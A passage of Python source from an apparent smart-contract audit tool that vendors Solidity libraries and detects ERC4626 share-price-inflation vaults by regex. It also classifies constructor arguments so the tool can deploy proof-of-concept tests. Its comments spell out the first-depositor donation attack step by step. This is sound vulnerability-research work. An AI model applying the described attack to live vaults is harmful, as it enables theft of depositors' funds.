# per-process memoization caches keyed by the (resolved) audits root.
_SOLMATE_SIBLING_CACHE: Dict[str, Optional[str]] = {}
_OZ_SIBLING_CACHE: Dict[str, Optional[Dict[str, str]]] = {}


def _bounded_rglob(root: Path, rel_suffix: str):
    """Yield every path under `root` whose tail matches `rel_suffix`
    (e.g. "solmate/src/mixins/ERC4626.sol"), walking to a bounded depth and
    visiting at most a bounded number of directories, pruning heavy build/vcs
    dirs. A drop-in bounded replacement for `root.rglob(rel_suffix)` for the
    deep-suffix library markers: a hit is reported when a directory whose NAME
    equals the suffix's first component carries the remaining suffix tail. Order
    is os.walk order (deterministic per FS), deduplicated per yield path."""
    if not root.exists():
        return
    suffix_parts = tuple(p for p in rel_suffix.split("/") if p)
    if not suffix_parts:
        return
    head, tail = suffix_parts[0], suffix_parts[1:]
    base_depth = len(root.parts)
    visited = 0
    seen = set()
    for dirpath, dirnames, _filenames in os.walk(root):
        visited += 1
        if visited > _SIBLING_SCAN_MAX_DIRS:
            return
        cur = Path(dirpath)
        depth = len(cur.parts) - base_depth
        if depth >= _SIBLING_SCAN_MAX_DEPTH:
            dirnames[:] = []  # do not descend further
        else:
            # prune heavy / irrelevant subtrees in-place so os.walk skips them.
            dirnames[:] = [d for d in dirnames if d not in _SIBLING_SCAN_PRUNE]
        # a marker hit: a child dir named `<head>` that carries the suffix tail.
        for d in dirnames:
            if d != head:
                continue
            cand = cur / head
            for part in tail:
                cand = cand / part
            if cand.exists() and str(cand) not in seen:
                seen.add(str(cand))
                yield cand


def _find_sibling_solmate(lib_dir: Path) -> Optional[Path]:
    """Locate a solmate `src/` root to vendor, preferring the SAME sibling lib/
    that already supplied OZ+forge-std (so one coherent checkout backs all the
    common libs), then any solmate checkout under ~/audits. Returns the `src/`
    root (the `solmate/` import prefix maps to it) or None. Honors the env
    disable hook. GENERIC: solmate is a well-known common library, not a target
    identity; nothing here keys on any project name."""
    if _common_lib_vendor_disabled():
        return None
    # (1) prefer the co-located sibling checkout.
    local = lib_dir / "solmate" / "src"
    if _solmate_src_is_valid(local):
        return local
    # (2) explicit override path (consistent with AUDITOOOR_FORGE_STD).
    env = os.environ.get("AUDITOOOR_SOLMATE")
    if env:
        cand = Path(env)
        cand_src = cand if cand.name == "src" else cand / "src"
        if _solmate_src_is_valid(cand_src):
            return cand_src
    # (3) last resort: any solmate checkout under ~/audits. FIX 2: bound the scan
    # (depth + dir cap + prune) and CACHE the result per process so a 100+-call
    # test suite does not re-walk the deep nested vendoring trees every call.
    home_audits = Path.home() / "audits"
    key = str(home_audits)
    if key in _SOLMATE_SIBLING_CACHE:
        cached = _SOLMATE_SIBLING_CACHE[key]
        return Path(cached) if cached else None
    found: Optional[Path] = None
    if home_audits.exists():
        for marker in _bounded_rglob(home_audits, "solmate/src/mixins/ERC4626.sol"):
            src_dir = marker.parents[1]            # .../solmate/src
            if _solmate_src_is_valid(src_dir):
                found = src_dir
                break
    _SOLMATE_SIBLING_CACHE[key] = str(found) if found else None
    return found


def _common_lib_imports(test_src: str) -> Dict[str, bool]:
    """Classify which COMMON LIBRARY prefixes a (standalone) authored test (or
    the real source it imports) references, so the standalone runner can vendor
    exactly those. Recognizes the well-known library prefixes ONLY: solmate,
    OpenZeppelin (both the `@openzeppelin/` scoped and bare `openzeppelin-
    contracts/` foundry-install forms). Protocol-coupled application deps are
    deliberately NOT classified here - they are the deferred asymptotic tail."""
    return {
        "solmate": bool(re.search(r'["\']solmate/', test_src)),
        "oz": bool(re.search(r'["\']@?openzeppelin[-/]', test_src)),
        "forge_std": bool(re.search(r'["\']forge-std/', test_src)),
    }


def _synthesize_common_lib_remappings(test_src: str, forge_std: Path
                                      ) -> Optional[Dict[str, Path]]:
    """Build the remappings mapping for the COMMON LIBRARY deps a standalone
    authored test imports (solmate / OZ), reusing the existing forge-std +
    sibling-OZ discovery. Returns the prefix->path mapping for the libs the test
    actually needs, or None when the test needs a common lib that could not be
    located (caller blocks-with-obligation). forge-std is always resolvable here
    (the caller already found it); this only adds solmate/OZ on demand.

    GENERIC: routes purely on which well-known library prefix the test imports.
    In-repo bases (e.g. a project-local ERC4626 base) are NOT vendored here -
    they resolve via the real project remappings / src tree, not this function."""
    needs = _common_lib_imports(test_src)
    if not (needs["solmate"] or needs["oz"]):
        return None  # only the forge-std baseline is needed -> caller's default.
    if _common_lib_vendor_disabled():
        return None
    mapping: Dict[str, Path] = {"forge-std/": forge_std / "src"}
    ds_test = forge_std / "lib" / "ds-test" / "src"
    if (ds_test / "test.sol").exists():
        mapping["ds-test/"] = ds_test
    if needs["solmate"]:
        # discover solmate relative to forge-std's lib/ first, then ~/audits.
        solmate = _find_sibling_solmate(forge_std.parent)
        if solmate is None:
            return None
        mapping["solmate/"] = solmate
    if needs["oz"]:
        oz_map = _find_sibling_oz_and_forge_std(Path.home() / "audits")
        if oz_map is None or "@openzeppelin/contracts/" not in oz_map:
            return None
        mapping["@openzeppelin/contracts/"] = oz_map["@openzeppelin/contracts/"]
        mapping["openzeppelin-contracts/"] = oz_map["@openzeppelin/contracts/"]
        if "@openzeppelin/contracts-upgradeable/" in oz_map:
            mapping["@openzeppelin/contracts-upgradeable/"] = \
                oz_map["@openzeppelin/contracts-upgradeable/"]
    return mapping


def _find_sibling_oz_and_forge_std(audits_root: Path
                                   ) -> Optional[Dict[str, Path]]:
    """Locate a sibling workspace lib/ that ships BOTH an OZ contracts checkout
    (with the ERC4626 extension + ERC1967Proxy) AND forge-std. Returns a dict
    of resolved prefix->path roots, or None if none found. FIX 2: the marker scan
    is bounded (depth + dir cap + prune) and CACHED per process so a 100+-call
    test suite does not re-walk the deep nested OZ vendoring trees every call."""
    if not audits_root.exists():
        return None
    # respect the vendor-disable hook (mirrors `_find_sibling_solmate`): when
    # disabled the cache is neither read nor written, so a test that toggles the
    # hook is not served a stale enabled-state mapping populated by an earlier
    # (enabled) call - e.g. the module-import skipUnless probe.
    if _common_lib_vendor_disabled():
        return None
    key = str(audits_root)
    if key in _OZ_SIBLING_CACHE:
        cached = _OZ_SIBLING_CACHE[key]
        return ({k: Path(v) for k, v in cached.items()}
                if cached is not None else None)
    # marker: <lib>/openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol
    #   parents: ERC1967(0) proxy(1) contracts(2) openzeppelin-contracts(3) lib(4)
    candidates: List[Dict[str, Any]] = []
    for marker in _bounded_rglob(
            audits_root,
            "openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol"):
        oz_root = marker.parents[3]               # .../openzeppelin-contracts
        lib_dir = marker.parents[4]               # .../lib (or whatever parent dir)
        oz_contracts = oz_root / "contracts"
        if not (oz_contracts / "token" / "ERC20" / "extensions" / "ERC4626.sol").exists():
            continue
        fstd = lib_dir / "forge-std"
        if not (fstd / "src" / "Test.sol").exists():
            continue
        # require OZ 5.x (the deployable upgradeable-vault family targets 5.x).
        pkg = oz_root / "package.json"
        try:
            if pkg.exists():
                import json as _json
                ver = _json.loads(pkg.read_text()).get("version", "")
                if ver and not ver.startswith("5."):
                    continue
        except (OSError, ValueError):
            pass
        upg = lib_dir / "openzeppelin-contracts-upgradeable"
        res = {
            "@openzeppelin/contracts/": oz_contracts,
            # bare `openzeppelin-contracts/<path>` prefix (the foundry-install
            # default, used by solmate-stack projects like the inherited-ERC4626
            # family) resolves to the SAME contracts/ root, sans the `@` scope.
            "openzeppelin-contracts/": oz_contracts,
            "forge-std/": fstd / "src",
            "hardhat/": fstd / "src",  # hardhat/console.sol -> forge-std console shim
        }
        # forge-std/src/Test.sol imports `ds-test/test.sol`. With an ABSOLUTE-PATH
        # forge-std remap (not a project-root lib/ checkout), forge does NOT auto-
        # discover the nested ds-test, so the import fails unless we remap it too.
        ds_test = fstd / "lib" / "ds-test" / "src"
        if (ds_test / "test.sol").exists():
            res["ds-test/"] = ds_test
        has_upg = (upg / "contracts").exists()
        if has_upg:
            res["@openzeppelin/contracts-upgradeable/"] = upg / "contracts"
        # solmate is the OTHER common library dep (the inherited-ERC4626 base
        # imports `solmate/{tokens,utils,mixins}/...`). Vendor it from the SAME
        # sibling lib/ when present, mirroring the forge-std discovery above; the
        # standard solmate import prefix `solmate/` maps to its `src/` root.
        solmate = _find_sibling_solmate(lib_dir)
        if solmate is not None:
            res["solmate/"] = solmate
        candidates.append({"mapping": res, "has_upg": has_upg,
                           "has_solmate": solmate is not None})
    if not candidates:
        _OZ_SIBLING_CACHE[key] = None
        return None
    # Prefer a checkout that ALSO ships the upgradeable contracts (the deployable
    # upgradeable-vault family needs both) AND a co-located solmate (so one
    # coherent sibling backs every common lib), else the first plain OZ checkout.
    candidates.sort(key=lambda c: (0 if c["has_upg"] else 1,
                                   0 if c.get("has_solmate") else 1))
    chosen = candidates[0]["mapping"]
    _OZ_SIBLING_CACHE[key] = {k: str(v) for k, v in chosen.items()}
    return chosen


def _project_needs_remapping_synthesis(project: Path) -> bool:
    """True when the project has no installed deps and no remappings.txt, so its
    real `@openzeppelin/...` / `forge-std/...` imports cannot resolve in-place."""
    if (project / "remappings.txt").exists():
        return False
    if (project / "lib" / "forge-std" / "src" / "Test.sol").exists():
        return False
    if (project / "node_modules" / "@openzeppelin" / "contracts").exists():
        return False
    return True


class _SynthesizedRemappings:
    """Context manager that writes a synthesized remappings.txt into `project`
    for the duration of an in-place forge run, then restores the original tree
    state (backs up + restores any pre-existing remappings.txt; removes a
    freshly-created one). Non-destructive by construction."""

    def __init__(self, project: Path, mapping: Dict[str, Path]):
        self.project = project
        self.mapping = mapping
        self.rm_path = project / "remappings.txt"
        self.backup: Optional[str] = None
        self.created = False

    def __enter__(self) -> "_SynthesizedRemappings":
        if self.rm_path.exists():
            self.backup = self.rm_path.read_text()
        else:
            self.created = True
        lines = [f"{prefix}={path.as_posix()}/" for prefix, path in self.mapping.items()]
        self.rm_path.write_text("\n".join(lines) + "\n")
        return self

    def __exit__(self, *exc) -> None:
        try:
            if self.backup is not None:
                self.rm_path.write_text(self.backup)
            elif self.created and self.rm_path.exists():
                self.rm_path.unlink()
        except OSError:
            pass


# ---------------------------------------------------------------------------
# Step 3: ERC4626 donation / share-price-inflation FAMILY (share-price
# manipulation CLASS). The detection is GENERIC and target-literal-free: it
# routes on the SHAPE, not on any contract/fn name. The canonical shape is a
# vault whose share-mint denominator (`totalAssets`) can be INFLATED by an
# external token transfer / donation while shares are minted via a
# rounding-sensitive `convertToShares` (integer division that rounds DOWN).
# A first-depositor mints 1 wei of shares, donates assets directly to the vault
# to inflate the live denominator, then a later victim deposit rounds to ZERO
# shares while its assets stay in the pool - redeemable by the attacker's one
# share. Covered sub-shapes: donation-to-vault inflating totalAssets/share-price,
# rounding-down-on-deposit, preview/convert mismatch, first-depositor skew.
# ---------------------------------------------------------------------------

# The denominator the donation inflates: a LIVE external-balance read of the
# vault's own asset holdings (`<token>.balanceOf(address(this))`) or a
# `totalAssets()` accessor that reads it. A donation (raw transfer to the vault)
# lifts this without minting shares -> share price inflates.
_DONATION_DENOM_RE = re.compile(
    r"\.\s*balanceOf\s*\(\s*address\s*\(\s*this\s*\)\s*\)"
)
_TOTAL_ASSETS_DECL_RE = re.compile(
    r"function\s+totalAssets\s*\(\s*\)[^{]*\{[^}]*"
    r"\.\s*balanceOf\s*\(\s*address\s*\(\s*this\s*\)\s*\)",
    re.S,
)

# The rounding-sensitive share conversion: `(assets * supply) / totalAssets`
# style integer division (rounds DOWN), OR a `convertToShares` accessor that
# performs it. The mulDiv-without-rounding-up shape is the bug; a virtual-offset
# / mulDiv(Rounding.Up) clean variant does NOT match (it is the mitigation).
_CONVERT_DOWN_RE = re.compile(
    r"\(\s*\w+\s*\*\s*\w+\s*\)\s*/\s*\w+"          # (assets * supply) / totalAssets
)
_CONVERT_TO_SHARES_FN_RE = re.compile(
    r"function\s+convertToShares\s*\(", re.S)

# A deposit/mint entrypoint that credits shares from the convert result. The
# external entrypoint the attacker + victim drive.
_DEPOSIT_FN_RE = re.compile(
    r"function\s+(deposit|mint)\s*\(\s*uint\d*\s+\w+\s*,\s*address\s+\w+\s*\)"
    r"\s*external", re.S)

# Virtual-offset MITIGATION markers: when present, the donation cannot round the
# victim to zero, so the shape is NOT vulnerable (the clean negative-control
# sibling). Detecting these lets the detector skip the patched variant honestly.
_VIRTUAL_OFFSET_RE = re.compile(
    r"VIRTUAL_SHARES|VIRTUAL_ASSETS|_decimalsOffset|decimalsOffset|"
    r"\+\s*1\s*;?\s*//.*virtual|Rounding\.Up|mulDiv\([^)]*Rounding",
    re.I,
)

# --- codex95 OBL3: INHERITED-ERC4626 share-inflation surface --------------
# scLiquity-class shape: the vault does NOT declare an in-contract
# `convertToShares` / `deposit(uint,address)` / `(a*b)/c` divide - instead it
# INHERITS an ERC4626 base (solmate / a project-local abstract base) where the
# deposit/mint entrypoints + the rounding-down share math live, and the vault
# overrides ONLY `totalAssets()` to return a RAW token balance. The donation
# lever is the same (raw transfer inflates `asset.balanceOf(address(this))`),
# but the in-contract `convertToShares`-fn regex misses it because the math is
# in the base. GENERIC: nothing keys on a target name; the surface is inferred
# from (a) ERC4626 inheritance, (b) a raw-balance totalAssets override, (c) the
# absence of a virtual-offset / dead-shares / min-first-deposit guard.

# The contract inherits an ERC4626 base. Recognized by an explicit `is ...
# ERC4626[Upgradeable] ...` in the contract declaration, OR by the contract
# overriding an ERC4626-only internal hook (`_convertToShares` / `_deposit` /
# `_withdraw` / a `totalAssets() ... override`) that only an ERC4626 descendant
# declares. Both forms are target-literal-free (the base name is an ERC-standard
# token, not a single target's identity).
_ERC4626_INHERIT_DECL_RE = re.compile(
    r"\b(?:contract|abstract\s+contract)\s+\w+\s+is\b[^{]*\bERC4626(?:Upgradeable)?\b",
    re.S,
)
_ERC4626_HOOK_OVERRIDE_RE = re.compile(
    r"function\s+(?:_convertToShares|_deposit|_withdraw|totalAssets)\s*\("
    r"[^;{]*\boverride\b",
    re.S,
)

# `totalAssets()` (override or plain) whose body returns a RAW token balance read
# (`<token>.balanceOf(address(this))`, optionally net of an accounting term). This
# is the donation-inflatable denominator the inherited share math divides by.
_RAW_BALANCE_TOTAL_ASSETS_RE = re.compile(
    r"function\s+totalAssets\s*\(\s*\)[^{]*\{[^}]*"
    r"\.\s*balanceOf\s*\(\s*address\s*\(\s*this\s*\)\s*\)",
    re.S,
)

# A built-in first-deposit guard that defends an inherited ERC4626 even with a
# raw-balance totalAssets: a dead-shares / minimum-first-deposit / virtual-offset
# guard. When present the inherited surface is NOT first-depositor-inflatable.
#
# codex95 OBL4(2a): the guard must be a REAL first-depositor defense, NOT just
# any rounding directive. A round-DOWN price-accounting `mulDiv(..., Rounding.
# Down)` (or a bare `mulDiv(..., Rounding...)` whose direction is Down) is the
# inflation-PERMITTING direction - it is bookkeeping, not a guard, so it must NOT
# veto the share-inflation shape. Only the INFLATION-RESISTING constructs count:
# a round-UP convert (`Rounding.Up` / `Math.Round.Up` / `rounding == ...Up`), a
# virtual-offset (VIRTUAL_SHARES/ASSETS, `_decimalsOffset`), dead-shares
# (DEAD_SHARES, `_mint(address(0), ...)`, burned shares), or a minimum-first-
# deposit floor. The previous broad `mulDiv\([^)]*Rounding` alternative matched
# the round-DOWN bookkeeping case and FALSE-POSITIVE vetoed real vaults; it is
# removed. `Rounding\.Up` (case-sensitive on `.Up`) is kept as the round-up
# guard. GENERIC: no target literal; the predicate is the guard-direction shape.
#
# `Rounding\.Up` is matched case-INSENSITIVELY on the WORD but the `.Up`
# direction word distinguishes it from `.Down` (the removed broad alternative
# matched both), so a case-insensitive flag is safe for the literal guards while
# the round-DOWN bookkeeping case no longer matches anything here.
_INHERITED_GUARD_RE = re.compile(
    r"VIRTUAL_SHARES|VIRTUAL_ASSETS|_decimalsOffset|decimalsOffset|"
    r"Rounding\.Up\b|Round\.Up\b|rounding\s*==\s*\w*\.?Up\b|"
    r"DEAD_SHARES|dead\s*shares|MINIMUM_(?:LIQUIDITY|SHARES|DEPOSIT)|"
    r"MIN_(?:LIQUIDITY|SHARES|DEPOSIT|FIRST_DEPOSIT)|"
    r"_mint\s*\(\s*address\s*\(\s*0\s*\)|burn(?:ed)?\s*shares|"
    r"require\s*\(\s*\w*[Ss]hares?\b[^;]*>=?\s*MIN",
    re.I,
)


def _detect_inherited_erc4626_inflation(src: str) -> Optional[Dict[str, Any]]:
    """Inherited-ERC4626 sub-shape (OBL3): the contract inherits an ERC4626 base
    (deposit/mint + share math in the base) and overrides ONLY `totalAssets()` to
    a raw `balanceOf(address(this))` read, with NO virtual-offset / dead-shares /
    min-first-deposit guard. The public entrypoint is the inherited `deposit` /
    `mint`; the bug is reachable through it. Returns the shape dict or None.
    GENERIC: no target name / address / method literal is used as match logic."""
    # Strip comments first: a NatSpec phrase like "no dead shares" or "//
    # totalAssets" must not satisfy (or wrongly veto) any predicate. The match
    # logic runs against CODE only.
    code = _strip_comments(src)
    inherits = bool(_ERC4626_INHERIT_DECL_RE.search(code)
                    or _ERC4626_HOOK_OVERRIDE_RE.search(code))
    if not inherits:
        return None
    if not _RAW_BALANCE_TOTAL_ASSETS_RE.search(code):
        return None
    if _INHERITED_GUARD_RE.search(code):
        # a built-in guard (virtual offset / dead shares / min first deposit)
        # defends the inherited surface -> not the first-depositor bug.
        return None
    return {"deposit_fn": "deposit",
            "denom_via_total_assets": True,
            "inherited_erc4626": True}


def detect_share_inflation_shape(src: str, fn: Optional[Dict[str, Any]]
                                 ) -> Optional[Dict[str, Any]]:
    """Recognize the ERC4626 donation / share-price-inflation SHAPE in `src`.
    Returns a dict of detected pieces or None when the shape is absent. GENERIC:
    matches on the donation-inflatable denominator + rounding-down convert +
    deposit entrypoint, never on a target literal.

    Two sub-shapes are recognized:
      IN-CONTRACT (the original): an explicit in-contract `convertToShares` fn
        doing a rounding-DOWN `(assets * supply) / totalAssets` divide + a public
        `deposit(uint,address)` entrypoint + a donation-inflatable denominator.
      INHERITED-ERC4626 (OBL3): the contract INHERITS an ERC4626 base (deposit/
        mint + share math in the base) and overrides ONLY `totalAssets()` to a
        raw `balanceOf(address(this))` read, with no virtual-offset / dead-shares
        / min-first-deposit guard. The public entrypoint is the inherited deposit.

    The shape is REJECTED when a virtual-offset / round-up mitigation is present
    (that is the clean sibling, not the bug)."""
    # Sub-shape B (INHERITED) is checked FIRST: when the contract inherits an
    # ERC4626 base, the in-contract convertToShares / deposit / (a*b)/c that
    # sub-shape A keys on actually live in the BASE (same file), so sub-shape A
    # would mis-fire and return a non-inherited shape whose `shares(addr)`
    # accessor does not exist. The inherited detector binds the share read to the
    # inherited ERC20 `balanceOf`, so it must win when inheritance is present.
    inherited = _detect_inherited_erc4626_inflation(src)
    if inherited is not None:
        return inherited
    # Sub-shape A: explicit in-contract convertToShares + deposit entrypoint
    # (no ERC4626 inheritance - the math is in THIS contract).
    if (_DONATION_DENOM_RE.search(src) or _TOTAL_ASSETS_DECL_RE.search(src)) and \
            _CONVERT_DOWN_RE.search(src) and _CONVERT_TO_SHARES_FN_RE.search(src):
        dep = _DEPOSIT_FN_RE.search(src)
        if dep and not _VIRTUAL_OFFSET_RE.search(src):
            return {"deposit_fn": dep.group(1),
                    "denom_via_total_assets": bool(
                        _TOTAL_ASSETS_DECL_RE.search(src))}
    return None


def _share_inflation_asset_arg(src: str, unit_name: str) -> Optional[str]:
    """Find the ERC20 asset the vault holds (the token the attacker donates).
    The vault takes it as a constructor `address`/`IERC20` arg, OR exposes it via
    a public `asset()` accessor / state var. Returns the var/accessor name the
    test funds through, or 'asset' as the ERC4626-standard default. Returns None
    only when there is no synthesizable single-asset shape."""
    # constructor `(address _asset)` / `(IERC20 _asset)` -> the asset is ctor-set.
    ctor = _constructor_params(src, unit_name) or ""
    params = _split_params(ctor)
    erc20_args = [n for (t, n) in params
                  if t == "address" or t in _ERC20_ARG_TYPES or t == "IERC20"]
    # the vault must read its asset balance somewhere (already checked by detect).
    if len(params) == 1 and erc20_args:
        return erc20_args[0].rstrip("_")
    if len(params) == 1 and params and params[0][0] == "address":
        return params[0][1].rstrip("_")
    # ERC4626 / accessor shape: a public `asset` state var or accessor.
    if re.search(r"\b(asset|underlying|token)\b", src):
        return "asset"
    return None


# --- codex95 OBL4 (1): MULTI-ARG role+asset ctor classification --------------
# A real vault ctor is often `(address admin, address keeper, ERC20 asset,
# string name, string symbol)`: exactly ONE arg is the deploy asset (the token
# the donation lever uses), the other ADDRESS args are role/config EOAs (admin /
# keeper / owner / manager / governor / ...), and the string args are metadata.
# We synthesize the deploy ONLY when exactly one param is the asset and EVERY
# other param is a fillable role-EOA / string / value-type. GENERIC: no target
# name / role name is hardcoded as drive logic - the asset arg is the one the
# vault actually uses as its asset (balanceOf / transferFrom / decimals lever),
# role args are recognized by being address-typed and NOT the asset, and value
# types are filled with their natural defaults.

# A role/config name HINT (used only to keep the synthesized comment honest about
# which arg is which - NOT as match logic; an address arg that is not the asset
# is filled with a vm.addr() EOA regardless of whether its name is in this set).
_ROLE_NAME_HINT_RE = re.compile(
    r"admin|keeper|owner|manager|governor|guardian|operator|treasury|"
    r"controller|authority|fee\w*recipient|recipient|beneficiary|feeReceiver",
    re.I,
)

# value-type ctor args (besides the asset + role-address args) the author fills
# with a natural default so the REAL multi-arg ctor signature is satisfied.
_CTOR_STRING_TYPES = {"string"}


def _asset_arg_in_ctor(src: str, params: List[Tuple[str, str]],
                       inherited_shape: bool) -> Optional[Tuple[str, str]]:
    """Pick the single ctor (type,name) param that is the deploy ASSET - the
    token the donation lever uses. Preference order: (a) an ERC20/IERC20-typed
    arg; (b) on the inherited shape, an interface/contract-typed arg the vault
    uses as its asset (`<arg>.balanceOf` / `.transferFrom` / `.decimals` - the
    levers the shape already requires, or passed into the inherited base ctor);
    (c) a plain `address` arg the vault uses as its asset. Returns the (type,
    name) tuple or None when no single arg is identifiably the asset. GENERIC:
    the asset is recognized by USAGE, never by a name literal."""
    # (a) an ERC20-family typed arg is unambiguously the asset.
    erc20_typed = [(t, n) for (t, n) in params
                   if t in _ERC20_ARG_TYPES or t == "IERC20"]
    if len(erc20_typed) == 1:
        return erc20_typed[0]
    if len(erc20_typed) > 1:
        return None  # ambiguous: two token args, not a single-asset deploy

    def _used_as_asset(name: str) -> bool:
        bare = re.escape(name.rstrip("_"))
        nm = re.escape(name)
        # the arg is read as a token (balanceOf/transferFrom/transfer/decimals),
        # CAST to a token interface (`IERC20(<arg>)` / `IFoo(<arg>)` stored as the
        # asset state var, e.g. `asset = IERC20(_asset)`), OR forwarded into an
        # inherited ERC4626/ERC20 base ctor (`ERC4626(<arg>, ...)`) where the base
        # treats it as `asset`. Any of these marks the arg as the deploy asset.
        return bool(
            re.search(rf"\b(?:{bare}|{nm})\s*\.\s*"
                      r"(?:balanceOf|transferFrom|transfer|decimals)\s*\(", src)
            or re.search(rf"\bERC4626\s*\(\s*(?:{bare}|{nm})\b", src)
            or re.search(rf"\bERC20\s*\(\s*(?:{bare}|{nm})\b", src)
            or re.search(rf"\bI?ERC20\w*\s*\(\s*(?:{bare}|{nm})\s*\)", src)
            or re.search(rf"\basset\w*\s*=\s*\w+\s*\(\s*(?:{bare}|{nm})\s*\)", src))

    # candidate asset args: address-typed OR interface/contract-typed (not a
    # string/value type). Strings/uints/bools/bytes are never the asset.
    arg_is_value = lambda t: bool(
        re.fullmatch(r"(?:u?int\d*|bool|bytes\d*|bytes)", t)
        or t in _CTOR_STRING_TYPES)
    eligible = [(t, n) for (t, n) in params
                if (t == "address" or re.match(r"^[A-Za-z_]\w*$", t))
                and not arg_is_value(t)]
    # (b)/(c): exactly one eligible arg the vault USES as its asset.
    used = [(t, n) for (t, n) in eligible if _used_as_asset(n)]
    if len(used) == 1:
        return used[0]
    # (d) single-eligible-arg fallback: when there is EXACTLY ONE address/
    # interface-typed candidate arg total (and every other param is a value/
    # string type), that arg is the asset even if the usage grep missed it (e.g.
    # `asset = IERC20(_asset)` written in an unusual form). This preserves the
    # original single-asset-ctor behavior (`(address _asset)` / `(IERC20 asset)`).
    if len(eligible) == 1 and len(used) == 0:
        return eligible[0]
    return None


# non-token interface-call discriminator: a `<Iface>(<arg>).<method>(` or a state
# var assigned `<Iface>(<arg>)` that is later called marks the address arg as a
# CONTRACT DEPENDENCY (oracle / registry / router), NOT a fillable role EOA.
def _addr_arg_is_contract_dep(src: str, argname: str) -> bool:
    """True when the `address <argname>` ctor param is cast to a NON-token
    interface and that interface is CALLED (so an EOA fill would revert). The
    token-interface families (ERC20 / ERC4626) are the ASSET, handled elsewhere
    and excluded here. GENERIC: matched by the cast+call shape, not a name."""
    bare = re.escape(argname.rstrip("_"))
    nm = re.escape(argname)
    token_ifaces = _ADDR_CAST_ERC20_IFACES | _ADDR_CAST_ERC4626_IFACES | {
        "IERC20", "ERC20", "IERC4626", "ERC4626"}
    # state vars assigned `IFace(<arg>)` (the common `oracle = IPriceOracle(_o)`).
    assigned_vars: set = set()
    for m in re.finditer(
            rf"\b(\w+)\s*=\s*([A-Za-z_]\w*)\s*\(\s*(?:{bare}|{nm})\s*\)", src):
        var, iface = m.group(1), m.group(2)
        if iface in token_ifaces:
            continue  # token-interface cast -> the asset, not a contract dep.
        assigned_vars.add(var)
    # the arg (or its de-underscored form) is itself cast+called inline:
    # `IFace(<arg>).method(` with a non-token interface.
    for m in re.finditer(
            rf"\b([A-Za-z_]\w*)\s*\(\s*(?:{bare}|{nm})\s*\)\s*\.\s*\w+\s*\(",
            src):
        if m.group(1) not in token_ifaces:
            return True
    # any assigned non-token interface var that is later CALLED.
    for var in assigned_vars:
        if re.search(rf"\b{re.escape(var)}\s*\.\s*\w+\s*\(", src):
            return True
    return False


def _classify_share_inflation_ctor(
        src: str, unit_name: str, params: List[Tuple[str, str]],
        inherited_shape: bool) -> Optional[Dict[str, Any]]:
    """Classify EACH ctor param into {asset, role-eoa, string, value} and build
    the full positional ctor-arg list. Returns
    {"args": ["<expr>", ...], "asset_index": int, "asset_type": str,
     "import_extra": [<iface>...], "asset_name": str, "roles": [(name, addr)...]}
    or None when the ctor is NOT (exactly one asset + every other arg a fillable
    role-EOA / string / value-type). GENERIC: the asset is found by usage, role
    address args get vm.addr(N) EOAs, strings/values get natural defaults.

    The synthesized token EXPRESSION at the asset slot is filled in by the caller
    (it needs the `token` local the test declares); here the slot is marked with
    the sentinel '<<ASSET>>' so the caller can substitute its cast expression."""
    asset = _asset_arg_in_ctor(src, params, inherited_shape)
    if asset is None:
        return None
    asset_type, asset_name = asset
    args: List[str] = []
    import_extra: List[str] = []
    roles: List[Tuple[str, str]] = []
    role_idx = 0
    for (t, n) in params:
        if (t, n) == asset:
            args.append("<<ASSET>>")
            continue
        # role / config ADDRESS arg -> a distinct EOA via vm.addr(N>=1) - ONLY if
        # it is a plain role/config address (stored / role-granted / compared),
        # NOT a CONTRACT DEPENDENCY the vault casts to a non-token interface and
        # CALLS (oracle / registry / router). A contract-dep address filled with
        # an EOA would make the vault's call revert (no code at the EOA), so such
        # a ctor is NOT generically synthesizable here -> block honestly. (The
        # obl2 etch path backs hardcoded-CONSTANT deps; a ctor-ARG contract dep
        # needs a dep-mock author that is out of OBL4's scope.)
        if t == "address":
            if _addr_arg_is_contract_dep(src, n):
                return None
            role_idx += 1
            expr = f"vm.addr({role_idx})"
            args.append(expr)
            roles.append((n, expr))
            continue
        # string metadata (name / symbol) -> a literal.
        if t in _CTOR_STRING_TYPES:
            args.append('"PoC"')
            continue
        # uintN / intN -> 1 ; bool -> false ; bytesN -> zero.
        if re.fullmatch(r"u?int\d*", t):
            args.append("1")
            continue
        if t == "bool":
            args.append("false")
            continue
        if re.fullmatch(r"bytes\d+", t):
            args.append(f"{t}(0)")
            continue
        if t in ("bytes",):
            args.append('""')
            continue
        # any OTHER type (struct / interface that is NOT the asset / array /
        # custom contract) is not synthesizable -> block honestly.
        return None
    return {"args": args, "asset_type": asset_type, "asset_name": asset_name,
            "import_extra": import_extra, "roles": roles}


# --- codex95 OBL2: constant-dep + ctor-time external-call deploy shape -------
# A single-asset-ctor donation/inflation vault that also references HARDCODED-
# CONSTANT external-dependency addresses (`<Iface> constant DEP = 0x..;` or an
# immutable set to a literal) AND calls methods on them IN THE CONSTRUCTOR (e.g.
# `asset.approve(dep, max); dep.register(this);`). A naive `new Vault(asset)`
# deploy REVERTS because the constant address has no code under test. The fix is
# to synthesize a minimal mock implementing exactly the methods the vault calls
# on the constant dep, then vm.etch its runtime code at the constant address
# BEFORE deploy so the REAL constructor's external calls succeed. GENERIC: no
# constant NAME, address literal, or method name is hardcoded in the tool - the
# mock is synthesized from the methods the contract actually invokes.

# A constant/immutable declared with a NON-token interface/contract type (the
# token-typed ones are already routed by `_hardcoded_constant_deps`). We allow an
# optional cast prefix before the 20-byte hex literal, same as the token regex.
_CONST_ANY_ADDR_DECL_RE = re.compile(
    r"\b([A-Za-z_]\w*)\s+(?:public\s+|private\s+|internal\s+)?"
    r"constant\s+(\w+)\s*=\s*(?:[A-Za-z_]\w*\s*\(\s*)?(?:address\s*\(\s*)?"
    r"(0x[0-9a-fA-F]{40})",
)


def _const_addr_decls(src: str) -> List[Dict[str, str]]:
    """Find ALL constant/immutable dependency declarations bound to a literal
    address, returning {"type", "name", "addr"} for each. Broader than
    `_hardcoded_constant_deps` (which only routes ERC20/ERC4626-typed ones): this
    captures any interface/contract-typed constant dep (e.g. `IYieldPool constant
    pool = IYieldPool(0x..)`) so a ctor-time call on it can be backed by a
    synthesized generic mock. GENERIC: no name/address literal is hardcoded."""
    out: List[Dict[str, str]] = []
    seen: set = set()
    for m in _CONST_ANY_ADDR_DECL_RE.finditer(src):
        decl_type, name, addr = m.group(1), m.group(2), m.group(3)
        if name in seen:
            continue
        seen.add(name)
        out.append({"type": decl_type, "name": name, "addr": addr})
